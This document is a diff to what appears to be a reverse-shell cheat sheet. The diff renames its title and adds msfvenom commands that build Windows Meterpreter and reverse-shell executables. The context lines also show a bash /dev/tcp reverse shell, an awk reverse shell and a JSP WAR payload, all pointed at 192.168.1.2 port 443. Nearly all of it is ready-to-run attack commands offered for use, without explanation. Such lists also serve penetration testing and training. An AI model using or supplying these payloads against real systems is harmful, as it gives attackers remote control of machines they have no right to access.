@@ -1,4 +1,4 @@
-## Reverse-Shell-FULL
+## Reverse Shell (Netcat)
 
 ## Bash
 bash -i >& /dev/tcp/192.168.1.2/443 0>&1
@@ -83,3 +83,13 @@ awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |
 ## War
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
+
+## Metasploit Meterpreter Shell
+## Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
+
+## or
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
+
+## LINUX
